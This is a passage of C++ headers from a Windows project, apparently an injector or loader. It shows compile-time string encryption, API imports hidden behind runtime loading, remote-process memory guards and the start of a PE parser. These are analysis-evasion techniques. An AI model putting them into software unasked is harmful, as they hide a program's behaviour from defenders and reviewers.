#define XOR_STR_A(s) XOR_STR_A_IMPL(s, __COUNTER__)

#define XOR_STR_W_IMPL(s, c)                                                                                          \
	::xor_string::XorDecrypted<wchar_t, (sizeof(s) / sizeof((s)[0])), (::xor_string::kBaseKey ^ (static_cast<unsigned>(c) * ::xor_string::kGolden))>( \
		[]() -> const ::xor_string::XorEncrypted<wchar_t, (sizeof(s) / sizeof((s)[0])), (::xor_string::kBaseKey ^ (static_cast<unsigned>(c) * ::xor_string::kGolden))> & { \
			static constexpr ::xor_string::XorEncrypted<wchar_t, (sizeof(s) / sizeof((s)[0])), (::xor_string::kBaseKey ^ (static_cast<unsigned>(c) * ::xor_string::kGolden))> kc_enc( \
				s, std::make_index_sequence<(sizeof(s) / sizeof((s)[0]))> {});                                              \
			return kc_enc;                                                                                             \
		}())
#define XOR_STR_W(s) XOR_STR_W_IMPL(s, __COUNTER__)

```

### Ameger/Core/Foundation/Primitives/KcStrings/KcLayered.h â€” 260 lines â€” sha12:3346819E5E71
```c-header
#pragma once

#include <cstddef>
#include <cstdint>
#include <utility>

#include "Core/DomainKey.h"

namespace kc_strings
{
namespace detail
{

	constexpr std::uint32_t kXteaDelta = 0x9E3779B9u;
	constexpr std::size_t kXteaRounds = 32;

	template <bool kEncrypt>
	constexpr void XteaBlockCrypt(std::uint8_t * block, const std::uint32_t tk[4]) noexcept
	{
		std::uint32_t v0 = static_cast<std::uint32_t>(block[0])
			| (static_cast<std::uint32_t>(block[1]) << 8)
			| (static_cast<std::uint32_t>(block[2]) << 16)
			| (static_cast<std::uint32_t>(block[3]) << 24);
		std::uint32_t v1 = static_cast<std::uint32_t>(block[4])
			| (static_cast<std::uint32_t>(block[5]) << 8)
			| (static_cast<std::uint32_t>(block[6]) << 16)
			| (static_cast<std::uint32_t>(block[7]) << 24);

		std::uint32_t sum = kEncrypt ? 0u : kXteaDelta * static_cast<std::uint32_t>(kXteaRounds);
		for (std::size_t r = 0; r < kXteaRounds; ++r)
		{
			if constexpr (kEncrypt)
			{
				v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + tk[sum & 3]);
				sum += kXteaDelta;
				v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + tk[(sum >> 11) & 3]);
			}
			else
			{
				v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + tk[(sum >> 11) & 3]);
				sum -= kXteaDelta;
				v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + tk[sum & 3]);
			}
		}

		block[0] = static_cast<std::uint8_t>(v0);
		block[1] = static_cast<std::uint8_t>(v0 >> 8);
		block[2] = static_cast<std::uint8_t>(v0 >> 16);
		block[3] = static_cast<std::uint8_t>(v0 >> 24);
		block[4] = static_cast<std::uint8_t>(v1);
		block[5] = static_cast<std::uint8_t>(v1 >> 8);
		block[6] = static_cast<std::uint8_t>(v1 >> 16);
		block[7] = static_cast<std::uint8_t>(v1 >> 24);
	}

	constexpr void XteaBlockEncrypt(std::uint8_t * block, const std::uint32_t tk[4]) noexcept
	{
		XteaBlockCrypt<true>(block, tk);
	}

	constexpr void XteaBlockDecrypt(std::uint8_t * block, const std::uint32_t tk[4]) noexcept
	{
		XteaBlockCrypt<false>(block, tk);
	}

	constexpr std::uint8_t LayerXorKey(std::uint32_t keyA, std::size_t idx) noexcept
	{
		return static_cast<std::uint8_t>((keyA >> ((idx % 4) * 8)) ^ (idx * 0x9E3779B9u));
	}

	template <std::size_t N, std::uint32_t Seed>
	struct BytePermutation
	{
		static_assert(N > 1, "BytePermutation needs at least two elements");

		std::size_t Forward[N]{};
		std::size_t Inverse[N]{};

		constexpr BytePermutation() noexcept : Forward{}, Inverse{}
		{
			for (std::size_t i = 0; i < N; ++i)
			{
				Forward[i] = i;
			}

			std::uint32_t state = Seed;

			for (std::size_t i = N - 1; i > 0; --i)
			{
				state = state * 0x41C64E6Du + 0x3039u;
				const std::size_t j = (state >> 16) % (i + 1);
				const std::size_t tmp = Forward[i];
				Forward[i] = Forward[j];
				Forward[j] = tmp;
			}

			for (std::size_t i = 0; i < N; ++i)
			{
				Inverse[Forward[i]] = i;
			}
		}
	};
}

template <std::size_t N, std::uint32_t KeyA, std::uint32_t KeyB0, std::uint32_t KeyB1, std::uint32_t KeyB2, std::uint32_t KeyB3, std::uint32_t ShuffleSeed>
class KcLayeredString
{
	static constexpr std::size_t kPadded = ((N + 7) / 8) * 8;

	std::uint8_t m_data[kPadded]{};
	static constexpr detail::BytePermutation<kPadded, ShuffleSeed> s_perm{};

public:
	template <std::size_t... Is>
	constexpr KcLayeredString(const char(&str)[N], std::index_sequence<Is...>) noexcept
		: m_data{}
	{
		const std::uint8_t src[] = { static_cast<std::uint8_t>(str[Is])... };
		std::uint8_t buf[kPadded]{};
		for (std::size_t i = 0; i < N; ++i)
		{
			buf[i] = src[i];
		}

		for (std::size_t i = 0; i < kPadded; ++i)
		{
			buf[i] ^= detail::LayerXorKey(KeyA, i);
		}

		const std::uint32_t tk[4] = { KeyB0, KeyB1, KeyB2, KeyB3 };
		for (std::size_t blk = 0; blk < kPadded; blk += 8)
		{
			detail::XteaBlockEncrypt(buf + blk, tk);
		}

		for (std::size_t i = 0; i < kPadded; ++i)
		{
			m_data[s_perm.Forward[i]] = buf[i];
		}
	}

	__forceinline void Decrypt(char * out) const noexcept
	{
		std::uint8_t buf[kPadded];
		for (std::size_t i = 0; i < kPadded; ++i)
		{
			buf[s_perm.Inverse[i]] = m_data[i];
		}

		const std::uint32_t tk[4] = { KeyB0, KeyB1, KeyB2, KeyB3 };
		for (std::size_t blk = 0; blk < kPadded; blk += 8)
		{
			detail::XteaBlockDecrypt(buf + blk, tk);
		}

		for (std::size_t i = 0; i < N; ++i)
		{
			out[i] = static_cast<char>(static_cast<std::uint8_t>(buf[i] ^ detail::LayerXorKey(KeyA, i)));
		}

		detail::Wipe<std::uint8_t, kPadded>(buf);
	}

	static constexpr std::size_t length() noexcept
	{
		return N - 1;
	}
};

template <std::size_t N, std::uint32_t KeyA, std::uint32_t KeyB0, std::uint32_t KeyB1, std::uint32_t KeyB2, std::uint32_t KeyB3, std::uint32_t ShuffleSeed>
class KcDecryptedLayered
{
	char m_buf[N];

	KcDecryptedLayered(const KcDecryptedLayered &) = delete;
	KcDecryptedLayered & operator=(const KcDecryptedLayered &) = delete;

public:
	explicit KcDecryptedLayered(const KcLayeredString<N, KeyA, KeyB0, KeyB1, KeyB2, KeyB3, ShuffleSeed> & enc) noexcept
	{
		enc.Decrypt(m_buf);
	}

	~KcDecryptedLayered() noexcept
	{
		volatile char * p = m_buf;
		for (std::size_t i = 0; i < N; ++i)
		{
			p[i] = 0;
		}
	}

	__forceinline const char * c_str() const noexcept
	{
		return m_buf;
	}
};

template <std::size_t N, std::uint32_t KeyA, std::uint32_t KeyB0, std::uint32_t KeyB1, std::uint32_t KeyB2, std::uint32_t KeyB3, std::uint32_t ShuffleSeed>
__forceinline KcDecryptedLayered<N, KeyA, KeyB0, KeyB1, KeyB2, KeyB3, ShuffleSeed> KcMakeLayered(const KcLayeredString<N, KeyA, KeyB0, KeyB1, KeyB2, KeyB3, ShuffleSeed> & enc) noexcept
{
	return KcDecryptedLayered<N, KeyA, KeyB0, KeyB1, KeyB2, KeyB3, ShuffleSeed>(enc);
}

template <std::size_t N, std::uint32_t KeyA, std::uint32_t KeyB0, std::uint32_t KeyB1, std::uint32_t KeyB2, std::uint32_t KeyB3, std::uint32_t ShuffleSeed>
class KcLayeredWString
{
	static constexpr std::size_t kBytes = N * sizeof(wchar_t);
	static constexpr std::size_t kPadded = ((kBytes + 7) / 8) * 8;

	std::uint8_t m_data[kPadded]{};
	static constexpr detail::BytePermutation<kPadded, ShuffleSeed> s_perm{};

public:
	template <std::size_t... Is>
	constexpr KcLayeredWString(const wchar_t(&str)[N], std::index_sequence<Is...>) noexcept
		: m_data{}
	{
		const std::uint16_t src[] = { static_cast<std::uint16_t>(str[Is])... };
		std::uint8_t buf[kPadded]{};
		for (std::size_t i = 0; i < N; ++i)
		{
			buf[i * 2] = static_cast<std::uint8_t>(src[i] & 0xFFu);
			buf[i * 2 + 1] = static_cast<std::uint8_t>((src[i] >> 8) & 0xFFu);
		}

		for (std::size_t i = 0; i < kPadded; ++i)
		{
			buf[i] ^= detail::LayerXorKey(KeyA, i);
		}

		const std::uint32_t tk[4] = { KeyB0, KeyB1, KeyB2, KeyB3 };
		for (std::size_t blk = 0; blk < kPadded; blk += 8)
		{
			detail::XteaBlockEncrypt(buf + blk, tk);
		}

		for (std::size_t i = 0; i < kPadded; ++i)
		{
			m_data[s_perm.Forward[i]] = buf[i];
		}
	}

	__forceinline void Decrypt(wchar_t * out) const noexcept
	{
		std::uint8_t buf[kPadded];
		for (std::size_t i = 0; i < kPadded; ++i)
		{
			buf[s_perm.Inverse[i]] = m_data[i];
		}

		const std::uint32_t tk[4] = { KeyB0, KeyB1, KeyB2, KeyB3 };
		for (std::size_t blk = 0; blk < kPadded; blk += 8)
		{
			detail::XteaBlockDecrypt(buf + blk, tk);
		}

		for (std::size_t i = 0; i < N; ++i)
		{
			const std::uint16_t lo = static_cast<std::uint16_t>(buf[i * 2] ^ detail::LayerXorKey(KeyA, i * 2));
			const std::uint16_t hi = static_cast<std::uint16_t>(buf[i * 2 + 1] ^ detail::LayerXorKey(KeyA, i * 2 + 1));
			out[i] = static_cast<wchar_t>(lo | (hi << 8));
		}

		detail::Wipe<std::uint8_t, kPadded>(buf);
	}

	static constexpr std::size_t length() noexcept
	{
		return N - 1;
	}
};

template <std::size_t N, std::uint32_t KeyA, std::uint32_t KeyB0, std::uint32_t KeyB1, std::uint32_t KeyB2, std::uint32_t KeyB3, std::uint32_t ShuffleSeed>
class KcDecryptedLayeredW
{
	wchar_t m_buf[N];

	KcDecryptedLayeredW(const KcDecryptedLayeredW &) = delete;
	KcDecryptedLayeredW & operator=(const KcDecryptedLayeredW &) = delete;

public:
	explicit KcDecryptedLayeredW(const KcLayeredWString<N, KeyA, KeyB0, KeyB1, KeyB2, KeyB3, ShuffleSeed> & enc) noexcept
	{
		enc.Decrypt(m_buf);
	}

	~KcDecryptedLayeredW() noexcept
	{
		volatile wchar_t * p = m_buf;
		for (std::size_t i = 0; i < N; ++i)
		{
			p[i] = 0;
		}
	}

	__forceinline const wchar_t * c_str() const noexcept
	{
		return m_buf;
	}
};

template <std::size_t N, std::uint32_t KeyA, std::uint32_t KeyB0, std::uint32_t KeyB1, std::uint32_t KeyB2, std::uint32_t KeyB3, std::uint32_t ShuffleSeed>
__forceinline KcDecryptedLayeredW<N, KeyA, KeyB0, KeyB1, KeyB2, KeyB3, ShuffleSeed> KcMakeLayeredW(const KcLayeredWString<N, KeyA, KeyB0, KeyB1, KeyB2, KeyB3, ShuffleSeed> & enc) noexcept
{
	return KcDecryptedLayeredW<N, KeyA, KeyB0, KeyB1, KeyB2, KeyB3, ShuffleSeed>(enc);
}
}

#define KC_STR_LAYERED(s) ::kc_strings::KcMakeLayered([]() -> const auto & { constexpr std::uint32_t kc_cnt = static_cast<std::uint32_t>(__COUNTER__); constexpr std::uint32_t kc_ln = static_cast<std::uint32_t>(__LINE__); constexpr std::uint32_t kc_sd = ::kc_strings::detail::kStringSeed; constexpr std::uint32_t kc_ka = ((kc_cnt + 1) * 0x45D9F3Bu ^ kc_ln * 0x1B873593u) ^ kc_sd; constexpr std::uint32_t kc_kb0 = ((kc_cnt + 2) * 0xCC9E2D51u ^ kc_ln * 0x85EBCA6Bu) ^ kc_sd; constexpr std::uint32_t kc_kb1 = ((kc_cnt + 3) * 0xC2B2AE35u ^ kc_ln * 0x27D4EB2Du) ^ kc_sd; constexpr std::uint32_t kc_kb2 = ((kc_cnt + 4) * 0x165667B1u ^ kc_ln * 0xE6546B64u) ^ kc_sd; constexpr std::uint32_t kc_kb3 = ((kc_cnt + 5) * 0x9E3779B9u ^ kc_ln * 0x41C64E6Du) ^ kc_sd; constexpr std::uint32_t kc_sh = ((kc_cnt + 6) * 0x6C62272Eu ^ kc_ln * 0xBEA6E8C5u) ^ kc_sd; static constexpr ::kc_strings::KcLayeredString<sizeof(s), kc_ka, kc_kb0, kc_kb1, kc_kb2, kc_kb3, kc_sh> kc_e(s, std::make_index_sequence<sizeof(s)>{}); return kc_e; }())

#define KC_WSTR_LAYERED(s) ::kc_strings::KcMakeLayeredW([]() -> const auto & { constexpr std::size_t kc_n = sizeof(s) / sizeof(wchar_t); constexpr std::uint32_t kc_cnt = static_cast<std::uint32_t>(__COUNTER__); constexpr std::uint32_t kc_ln = static_cast<std::uint32_t>(__LINE__); constexpr std::uint32_t kc_sd = ::kc_strings::detail::kStringSeed; constexpr std::uint32_t kc_ka = ((kc_cnt + 1) * 0x45D9F3Bu ^ kc_ln * 0x1B873593u) ^ kc_sd; constexpr std::uint32_t kc_kb0 = ((kc_cnt + 2) * 0xCC9E2D51u ^ kc_ln * 0x85EBCA6Bu) ^ kc_sd; constexpr std::uint32_t kc_kb1 = ((kc_cnt + 3) * 0xC2B2AE35u ^ kc_ln * 0x27D4EB2Du) ^ kc_sd; constexpr std::uint32_t kc_kb2 = ((kc_cnt + 4) * 0x165667B1u ^ kc_ln * 0xE6546B64u) ^ kc_sd; constexpr std::uint32_t kc_kb3 = ((kc_cnt + 5) * 0x9E3779B9u ^ kc_ln * 0x41C64E6Du) ^ kc_sd; constexpr std::uint32_t kc_sh = ((kc_cnt + 6) * 0x6C62272Eu ^ kc_ln * 0xBEA6E8C5u) ^ kc_sd; static constexpr ::kc_strings::KcLayeredWString<kc_n, kc_ka, kc_kb0, kc_kb1, kc_kb2, kc_kb3, kc_sh> kc_e(s, std::make_index_sequence<kc_n>{}); return kc_e; }())

```

### Ameger/Core/Foundation/Primitives/KcStrings/KcNarrow.h â€” 70 lines â€” sha12:72727F92E115
```c-header
#pragma once

#include <cstddef>
#include <cstdint>
#include <utility>

#include "Core/DomainKey.h"

namespace kc_strings
{

template <std::size_t N, std::uint32_t Key>
class KcEncryptedString
{
	std::uint8_t m_encrypted[N]{};

	static constexpr std::uint8_t EncryptByte(char c, std::size_t idx) noexcept
	{
		const std::uint8_t k = static_cast<std::uint8_t>((Key >> ((idx % 4) * 8)) ^ (idx * 0x9E3779B9u));
		return static_cast<std::uint8_t>(c) ^ k;
	}

public:
	template <std::size_t... Is>
	constexpr KcEncryptedString(const char(&str)[N], std::index_sequence<Is...>) noexcept
		: m_encrypted{ EncryptByte(str[Is], Is)... }
	{
	}

	__forceinline void Decrypt(char * out) const noexcept
	{
		for (std::size_t i = 0; i < N; ++i)
		{
			const std::uint8_t k = static_cast<std::uint8_t>((Key >> ((i % 4) * 8)) ^ (i * 0x9E3779B9u));
			out[i] = static_cast<char>(static_cast<std::uint8_t>(m_encrypted[i] ^ k));
		}
	}

	static constexpr std::size_t length() noexcept
	{
		return N - 1;
	}
};

template <std::size_t N, std::uint32_t Key>
class KcDecryptedString
{
	char m_buf[N];

	KcDecryptedString(const KcDecryptedString &) = delete;
	KcDecryptedString & operator=(const KcDecryptedString &) = delete;

public:
	explicit KcDecryptedString(const KcEncryptedString<N, Key> & enc) noexcept
	{
		enc.Decrypt(m_buf);
	}

	~KcDecryptedString() noexcept
	{
		volatile char * p = m_buf;
		for (std::size_t i = 0; i < N; ++i)
		{
			p[i] = 0;
		}
	}

	__forceinline operator const char *() const noexcept
	{
		return m_buf;
	}

	__forceinline const char * c_str() const noexcept
	{
		return m_buf;
	}
};

template <std::size_t N, std::uint32_t Key>
__forceinline KcDecryptedString<N, Key> KcMakeDecrypted(const KcEncryptedString<N, Key> & enc) noexcept
{
	return KcDecryptedString<N, Key>(enc);
}
}

#define KC_STR(s) ::kc_strings::KcMakeDecrypted([]() -> const auto & { constexpr std::uint32_t kc_k = static_cast<std::uint32_t>((__COUNTER__ + 1) * 0x45D9F3Bu ^ __LINE__ * 0x1B873593u ^ sizeof(s) * 0xCC9E2D51u ^ ::kc_strings::detail::kStringSeed); static constexpr ::kc_strings::KcEncryptedString<sizeof(s), kc_k> kc_e(s, std::make_index_sequence<sizeof(s)>{}); return kc_e; }())

```

### Ameger/Core/Foundation/Primitives/KcStrings/KcStack.h â€” 36 lines â€” sha12:78819760DA15
```c-header
#pragma once

#include <cstddef>
#include <cstdint>

#include "Core/DomainKey.h"

namespace kc_strings
{

template <typename CharT, CharT C, std::uint32_t Key, std::size_t Idx>
struct KcObfuscatedChar
{
	static constexpr CharT KeyByte() noexcept
	{
		return static_cast<CharT>((Key >> ((Idx % 4) * 8)) ^ (Idx * 0x27D4EB2Du));
	}

	static constexpr CharT Encrypted = static_cast<CharT>(C ^ KeyByte());

	__forceinline static CharT Decode() noexcept
	{
		volatile CharT enc = Encrypted;
		return static_cast<CharT>(static_cast<int>(enc) ^ static_cast<int>(KeyByte()));
	}
};
}

#define KC_STACK_KEY_ (static_cast<std::uint32_t>((__COUNTER__ + 1) * 0x45D9F3Bu ^ __LINE__ * 0x1B873593u ^ 0xDEADBEEFu ^ ::kc_strings::detail::kStringSeed))

namespace kc_strings
{

template <std::size_t Idx, typename CharT, std::size_t N>
__forceinline void KcStore(CharT (&buf)[N], CharT value) noexcept
{
	static_assert(N > 0, "KcStack destination buffer must not be empty");
	static_assert(Idx < N, "KcStack index exceeds the destination buffer");

	buf[Idx] = value;
}
}

#define KC_SC_(name, key, idx, c) ::kc_strings::KcStore<idx>(name, ::kc_strings::KcObfuscatedChar<char, c, key, idx>::Decode())

#define KC_SC_1(n, k, c0) KC_SC_(n,k,0,c0)
#define KC_SC_2(n, k, c0, c1) KC_SC_1(n,k,c0); KC_SC_(n,k,1,c1)
#define KC_SC_3(n, k, c0, c1, c2) KC_SC_2(n,k,c0,c1); KC_SC_(n,k,2,c2)

```

### Ameger/Core/Foundation/Primitives/KcStrings/KcWide.h â€” 72 lines â€” sha12:38EA37F0EFFD
```c-header
#pragma once

#include <cstddef>
#include <cstdint>
#include <utility>

#include "Core/DomainKey.h"

namespace kc_strings
{

template <std::size_t N, std::uint32_t Key>
class KcEncryptedWString
{
	std::uint16_t m_encrypted[N]{};

	static constexpr std::uint16_t EncryptWchar(wchar_t c, std::size_t idx) noexcept
	{
		const std::uint32_t derived = Key ^ static_cast<std::uint32_t>(idx * 0x9E3779B9u);
		const std::uint16_t k = static_cast<std::uint16_t>(derived ^ (derived >> 16));
		return static_cast<std::uint16_t>(c) ^ k;
	}

public:
	template <std::size_t... Is>
	constexpr KcEncryptedWString(const wchar_t(&str)[N], std::index_sequence<Is...>) noexcept
		: m_encrypted{ EncryptWchar(str[Is], Is)... }
	{
	}

	__forceinline void Decrypt(wchar_t * out) const noexcept
	{
		for (std::size_t i = 0; i < N; ++i)
		{
			const std::uint32_t derived = Key ^ static_cast<std::uint32_t>(i * 0x9E3779B9u);
			const std::uint16_t k = static_cast<std::uint16_t>(derived ^ (derived >> 16));
			out[i] = static_cast<wchar_t>(static_cast<std::uint16_t>(m_encrypted[i] ^ k));
		}
	}

	static constexpr std::size_t length() noexcept
	{
		return N - 1;
	}
};

template <std::size_t N, std::uint32_t Key>
class KcDecryptedWString
{
	wchar_t m_buf[N];

	KcDecryptedWString(const KcDecryptedWString &) = delete;
	KcDecryptedWString & operator=(const KcDecryptedWString &) = delete;

public:
	explicit KcDecryptedWString(const KcEncryptedWString<N, Key> & enc) noexcept
	{
		enc.Decrypt(m_buf);
	}

	~KcDecryptedWString() noexcept
	{
		volatile wchar_t * p = m_buf;
		for (std::size_t i = 0; i < N; ++i)
		{
			p[i] = 0;
		}
	}

	__forceinline operator const wchar_t *() const noexcept
	{
		return m_buf;
	}

	__forceinline const wchar_t * c_str() const noexcept
	{
		return m_buf;
	}
};

template <std::size_t N, std::uint32_t Key>
__forceinline KcDecryptedWString<N, Key> KcMakeDecryptedW(const KcEncryptedWString<N, Key> & enc) noexcept
{
	return KcDecryptedWString<N, Key>(enc);
}
}

#define KC_WSTR(s) ::kc_strings::KcMakeDecryptedW([]() -> const auto & { constexpr std::size_t kc_n = sizeof(s) / sizeof(wchar_t); constexpr std::uint32_t kc_k = static_cast<std::uint32_t>((__COUNTER__ + 1) * 0x45D9F3Bu ^ __LINE__ * 0x1B873593u ^ kc_n * 0xCC9E2D51u ^ ::kc_strings::detail::kStringSeed); static constexpr ::kc_strings::KcEncryptedWString<kc_n, kc_k> kc_e(s, std::make_index_sequence<kc_n>{}); return kc_e; }())


```

### Ameger/Core/Foundation/Primitives/ResourceGuard.h â€” 139 lines â€” sha12:13FB1520F4E2
```c-header
#pragma once

#include <Windows.h>

#include <type_traits>
#include <utility>

class UniqueHandle
{
	HANDLE m_Handle = nullptr;

public:
	UniqueHandle() = default;

	explicit UniqueHandle(HANDLE handle) : m_Handle(handle)
	{
	}

	UniqueHandle(const UniqueHandle &) = delete;
	UniqueHandle & operator=(const UniqueHandle &) = delete;

	UniqueHandle(UniqueHandle && other) noexcept : m_Handle(other.m_Handle)
	{
		other.m_Handle = nullptr;
	}

	UniqueHandle & operator=(UniqueHandle && other) noexcept
	{
		if (this != &other)
		{
			reset();
			m_Handle = other.m_Handle;
			other.m_Handle = nullptr;
		}

		return *this;
	}

	~UniqueHandle()
	{
		reset();
	}

	void reset(HANDLE handle = nullptr)
	{
		if (m_Handle && m_Handle != INVALID_HANDLE_VALUE)
		{
			CloseHandle(m_Handle);
		}

		m_Handle = handle;
	}

	HANDLE get() const
	{
		return m_Handle;
	}

	HANDLE release()
	{
		HANDLE handle = m_Handle;
		m_Handle = nullptr;
		return handle;
	}

	explicit operator bool() const
	{
		return m_Handle != nullptr && m_Handle != INVALID_HANDLE_VALUE;
	}

	operator HANDLE() const
	{
		return m_Handle;
	}
};

class RemoteAllocation
{
	HANDLE m_Process = nullptr;
	void * m_Address = nullptr;

public:
	RemoteAllocation() = default;

	RemoteAllocation(HANDLE process, void * address) : m_Process(process), m_Address(address)
	{
	}

	RemoteAllocation(const RemoteAllocation &) = delete;
	RemoteAllocation & operator=(const RemoteAllocation &) = delete;

	RemoteAllocation(RemoteAllocation && other) noexcept : m_Process(other.m_Process), m_Address(other.m_Address)
	{
		other.m_Process = nullptr;
		other.m_Address = nullptr;
	}

	RemoteAllocation & operator=(RemoteAllocation && other) noexcept
	{
		if (this != &other)
		{
			reset();
			m_Process = other.m_Process;
			m_Address = other.m_Address;
			other.m_Process = nullptr;
			other.m_Address = nullptr;
		}

		return *this;
	}

	~RemoteAllocation()
	{
		reset();
	}

	void reset(HANDLE process = nullptr, void * address = nullptr)
	{
		if (m_Process && m_Process != INVALID_HANDLE_VALUE && m_Address)
		{
			VirtualFreeEx(m_Process, m_Address, 0, MEM_RELEASE);
		}

		m_Process = process;
		m_Address = address;
	}

	void * get() const
	{
		return m_Address;
	}

	void release()
	{
		m_Process = nullptr;
		m_Address = nullptr;
	}
};

template<typename Callback>
class ScopeExit
{
	Callback m_Callback;
	bool m_Active = true;

public:
	explicit ScopeExit(Callback callback) : m_Callback(std::move(callback))
	{
		static_assert(std::is_nothrow_invocable_v<Callback &>, "ScopeExit callback must be noexcept");
	}

	ScopeExit(const ScopeExit &) = delete;
	ScopeExit & operator=(const ScopeExit &) = delete;

	~ScopeExit()
	{
		if (m_Active)
		{
			m_Callback();
		}
	}

	void dismiss()
	{
		m_Active = false;
	}
};

template<typename Callback>
ScopeExit<Callback> MakeScopeExit(Callback callback)
{
	return ScopeExit<Callback>(std::move(callback));
}

```

### Ameger/Core/Utility/Binary/DynamicAPI.h â€” 150 lines â€” sha12:A74330BF5BF1
```c-header
#pragma once

#include <Windows.h>
#include <wininet.h>
#include <DbgHelp.h>
#include <utility>
#include "Core/Foundation/Primitives/KcStrings/Core/XorString.h"

#ifndef _WIN64
#error This build is x64-only.
#endif

namespace dyn
{

	struct VARIANT_INT
	{
		WORD	vt;
		WORD	wReserved1;
		WORD	wReserved2;
		WORD	wReserved3;
		union
		{
			LONGLONG	llVal;
			ULONGLONG	ullVal;
			LONG		lVal;
			ULONG		ulVal;
			BYTE		bVal;
			SHORT		iVal;
			USHORT		uiVal;
			INT			intVal;
			UINT		uintVal;
		};
	};

	using Fn_SymInitialize		= BOOL(__stdcall *)(HANDLE, PCSTR, BOOL);
	using Fn_SymCleanup			= BOOL(__stdcall *)(HANDLE);
	using Fn_SymSetOptions		= DWORD(__stdcall *)(DWORD);
	using Fn_SymLoadModuleEx	= DWORD64(__stdcall *)(HANDLE, HANDLE, PCSTR, PCSTR, DWORD64, DWORD, PVOID, DWORD);
	using Fn_SymUnloadModule64	= BOOL(__stdcall *)(HANDLE, DWORD64);
	using Fn_SymFromName		= BOOL(__stdcall *)(HANDLE, PCSTR, PVOID);
	using Fn_SymGetTypeFromName	= BOOL(__stdcall *)(HANDLE, ULONG64, PCSTR, PVOID);
	using Fn_SymGetTypeInfo		= BOOL(__stdcall *)(HANDLE, DWORD64, ULONG, IMAGEHLP_SYMBOL_TYPE_INFO, PVOID);

	struct DbgHelpTable
	{
		Fn_SymInitialize		SymInitialize		= nullptr;
		Fn_SymCleanup			SymCleanup			= nullptr;
		Fn_SymSetOptions		SymSetOptions		= nullptr;
		Fn_SymLoadModuleEx		SymLoadModuleEx		= nullptr;
		Fn_SymUnloadModule64	SymUnloadModule64	= nullptr;
		Fn_SymFromName			SymFromName			= nullptr;
		Fn_SymGetTypeFromName	SymGetTypeFromName	= nullptr;
		Fn_SymGetTypeInfo		SymGetTypeInfo		= nullptr;
	};

	inline bool LoadDbgHelp(DbgHelpTable & table, HMODULE & module)
	{

		static const char * const kExports[] = {
			"SymInitialize",
			"SymCleanup",
			"SymSetOptions",
			"SymLoadModuleEx",
			"SymUnloadModule64",
			"SymFromName",
			"SymGetTypeFromName",
			"SymGetTypeInfo",
		};

		FARPROC resolved[_countof(kExports)]{};

		auto module_name = XOR_STR_W(L"dbghelp.dll");
		HMODULE loaded = LoadLibraryW(module_name.get());
		if (!loaded)
		{
			return false;
		}

		for (size_t i = 0; i < _countof(kExports); ++i)
		{
			FARPROC proc = GetProcAddress(loaded, kExports[i]);
			if (!proc)
			{
				FreeLibrary(loaded);

				return false;
			}

			resolved[i] = proc;
		}

		table.SymInitialize		= reinterpret_cast<Fn_SymInitialize>(resolved[0]);
		table.SymCleanup			= reinterpret_cast<Fn_SymCleanup>(resolved[1]);
		table.SymSetOptions		= reinterpret_cast<Fn_SymSetOptions>(resolved[2]);
		table.SymLoadModuleEx		= reinterpret_cast<Fn_SymLoadModuleEx>(resolved[3]);
		table.SymUnloadModule64	= reinterpret_cast<Fn_SymUnloadModule64>(resolved[4]);
		table.SymFromName		= reinterpret_cast<Fn_SymFromName>(resolved[5]);
		table.SymGetTypeFromName	= reinterpret_cast<Fn_SymGetTypeFromName>(resolved[6]);
		table.SymGetTypeInfo		= reinterpret_cast<Fn_SymGetTypeInfo>(resolved[7]);

		module = loaded;

		return true;
	}

	using Fn_InternetOpenW			= HINTERNET(__stdcall *)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
	using Fn_InternetSetOptionW	= BOOL(__stdcall *)(HINTERNET, DWORD, LPVOID, DWORD);
	using Fn_InternetQueryOptionW	= BOOL(__stdcall *)(HINTERNET, DWORD, LPVOID, LPDWORD);
	using Fn_InternetOpenUrlW		= HINTERNET(__stdcall *)(HINTERNET, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
	using Fn_InternetReadFile		= BOOL(__stdcall *)(HINTERNET, LPVOID, DWORD, LPDWORD);
	using Fn_InternetCloseHandle	= BOOL(__stdcall *)(HINTERNET);

	struct WinInetTable
	{
		Fn_InternetOpenW			InternetOpenW		= nullptr;
		Fn_InternetSetOptionW	InternetSetOptionW	= nullptr;
		Fn_InternetQueryOptionW	InternetQueryOptionW	= nullptr;
		Fn_InternetOpenUrlW		InternetOpenUrlW	= nullptr;
		Fn_InternetReadFile		InternetReadFile	= nullptr;
		Fn_InternetCloseHandle	InternetCloseHandle	= nullptr;
	};

	inline bool LoadWinInet(WinInetTable & table, HMODULE & module)
	{
		static const char * const kExports[] = {
			"InternetOpenW",
			"InternetSetOptionW",
			"InternetQueryOptionW",
			"InternetOpenUrlW",
			"InternetReadFile",
			"InternetCloseHandle",
		};

		FARPROC resolved[_countof(kExports)]{};

		auto module_name = XOR_STR_W(L"wininet.dll");
		HMODULE loaded = LoadLibraryW(module_name.get());
		if (!loaded)
		{
			return false;
		}

		for (size_t i = 0; i < _countof(kExports); ++i)
		{
			FARPROC proc = GetProcAddress(loaded, kExports[i]);
			if (!proc)
			{
				FreeLibrary(loaded);

				return false;
			}

			resolved[i] = proc;
		}

		table.InternetOpenW		= reinterpret_cast<Fn_InternetOpenW>(resolved[0]);
		table.InternetSetOptionW	= reinterpret_cast<Fn_InternetSetOptionW>(resolved[1]);
		table.InternetQueryOptionW	= reinterpret_cast<Fn_InternetQueryOptionW>(resolved[2]);
		table.InternetOpenUrlW	= reinterpret_cast<Fn_InternetOpenUrlW>(resolved[3]);
		table.InternetReadFile	= reinterpret_cast<Fn_InternetReadFile>(resolved[4]);
		table.InternetCloseHandle	= reinterpret_cast<Fn_InternetCloseHandle>(resolved[5]);

		module = loaded;

		return true;
	}

	inline void ReleaseModule(HMODULE & handle)
	{
		if (handle)
		{
			HMODULE to_free = handle;

			handle = nullptr;

			FreeLibrary(to_free);
		}
	}
}

```

### Ameger/Core/Utility/Binary/PEImage.h â€” 463 lines â€” sha12:EC6177344BB7
```c-header
#pragma once

#include <Windows.h>

#include <algorithm>

#include "Core/Foundation/Error.h"

namespace PE_IMAGE
{

	constexpr DWORD MAX_IMAGE_SIZE = 0x40000000;

	constexpr WORD MAX_SECTION_COUNT = 96;

	struct OPTIONS
	{
		bool RequireDll = false;
		bool RequireExports = false;
		bool RequireRelocations = false;
